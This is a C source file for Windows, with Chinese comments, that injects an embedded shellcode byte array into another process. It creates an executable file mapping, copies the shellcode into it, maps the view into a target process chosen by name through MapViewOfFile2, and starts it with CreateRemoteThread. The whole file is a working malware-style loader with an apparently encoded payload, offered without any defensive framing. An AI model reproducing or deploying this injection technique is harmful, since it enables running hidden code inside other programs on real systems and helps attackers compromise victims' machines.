#include <windows.h>
#include <Tlhelp32.h>
#pragma comment (lib, "OneCore.lib")	//MapViewOfFile2函数依赖这个静态链接库
UCHAR shellcode[] = { 0xba, 0x55, 0x6d, 0x81, 0x8e, 0xdb, 0xd3, 0xd9, 0x74, 0x24, 0xf4, 0x5e, 0x2b, 0xc9, 0xb1, 0x31, 0x31, 0x56, 0x13, 0x03, 0x56, 0x13, 0x83, 0xc6, 0x51, 0x8f, 0x74, 0x72, 0xb1, 0xcd, 0x77, 0x8b, 0x41, 0xb2, 0xfe, 0x6e, 0x70, 0xf2, 0x65, 0xfa, 0x22, 0xc2, 0xee, 0xae, 0xce, 0xa9, 0xa3, 0x5a, 0x45, 0xdf, 0x6b, 0x6c, 0xee, 0x6a, 0x4a, 0x43, 0xef, 0xc7, 0xae, 0xc2, 0x73, 0x1a, 0xe3, 0x24, 0x4a, 0xd5, 0xf6, 0x25, 0x8b, 0x08, 0xfa, 0x74, 0x44, 0x46, 0xa9, 0x68, 0xe1, 0x12, 0x72, 0x02, 0xb9, 0xb3, 0xf2, 0xf7, 0x09, 0xb5, 0xd3, 0xa9, 0x02, 0xec, 0xf3, 0x48, 0xc7, 0x84, 0xbd, 0x52, 0x04, 0xa0, 0x74, 0xe8, 0xfe, 0x5e, 0x87, 0x38, 0xcf, 0x9f, 0x24, 0x05, 0xe0, 0x6d, 0x34, 0x41, 0xc6, 0x8d, 0x43, 0xbb, 0x35, 0x33, 0x54, 0x78, 0x44, 0xef, 0xd1, 0x9b, 0xee, 0x64, 0x41, 0x40, 0x0f, 0xa8, 0x14, 0x03, 0x03, 0x05, 0x52, 0x4b, 0x07, 0x98, 0xb7, 0xe7, 0x33, 0x11, 0x36, 0x28, 0xb2, 0x61, 0x1d, 0xec, 0x9f, 0x32, 0x3c, 0xb5, 0x45, 0x94, 0x41, 0xa5, 0x26, 0x49, 0xe4, 0xad, 0xca, 0x9e, 0x95, 0xef, 0x80, 0x61, 0x2b, 0x8a, 0xe6, 0x62, 0x33, 0x95, 0x56, 0x0b, 0x02, 0x1e, 0x39, 0x4c, 0x9b, 0xf5, 0x7e, 0xb2, 0x79, 0xdc, 0x8a, 0x5b, 0x24, 0xb5, 0x37, 0x06, 0xd7, 0x63, 0x7b, 0x3f, 0x54, 0x86, 0x03, 0xc4, 0x44, 0xe3, 0x06, 0x80, 0xc2, 0x1f, 0x7a, 0x99, 0xa6, 0x1f, 0x29, 0x9a, 0xe2, 0x43, 0xac, 0x08, 0x6e, 0xaa, 0x4b, 0xa9, 0x15, 0xb2 };
DWORD GetProcessPid(char *ProcessName);
int main(int argc, char* arg[])
{
	// 1. 创建空的文件映像
    HANDLE hMapping = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sizeof(shellcode), NULL);// 创建一个file Mapping, 好像是空的, 返回文件映射对象句柄
	// 2. 创建file view
    LPVOID lpMapAddress = MapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, sizeof(shellcode)); //创建文件视图. 要将数据从文件映射到进程的虚拟内存，必须创建文件的视图. 返回指向文件视图的指针, 相当于VirturallAlloc分配的空间
	// 3. 往被映射的虚拟地址写入shellcode
    memcpy((PVOID)lpMapAddress, shellcode, sizeof(shellcode));  // 将shellcode写入刚刚创建的空的文件视图
    // 4. 将mapping映射到被注入进程的虚拟地址, 也是通过file view
    DWORD Pid = GetProcessPid(arg[1]);
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Pid);
	LPVOID lpMapAddressRemote = MapViewOfFile2(hMapping, hProcess, 0, NULL, 0, 0, PAGE_EXECUTE_READ);   // 将文件的节的视图映射到指定进程的地址空间.
    // 5. 启动运行shellcode
	HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpMapAddressRemote, NULL, 0, NULL);

	//UnmapViewOfFile(lpMapAddress);
	//CloseHandle(hMapping);
	return 0;
}

DWORD GetProcessPid(char *ProcessName)
{
	HANDLE hProcessSnap = NULL;   //define snapshot
	DWORD ProcessID = 0;
	PROCESSENTRY32 pe32 = { 0 };
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);   //create snapshot of all process in system
	pe32.dwSize = sizeof(PROCESSENTRY32);
	if (Process32First(hProcessSnap, &pe32))
	{
		do
		{
			if (!strcmp(ProcessName, pe32.szExeFile))
			{
				ProcessID = pe32.th32ProcessID;
				break;
			}
		} while (Process32Next(hProcessSnap, &pe32));
	}
	CloseHandle(hProcessSnap);
	return ProcessID;
}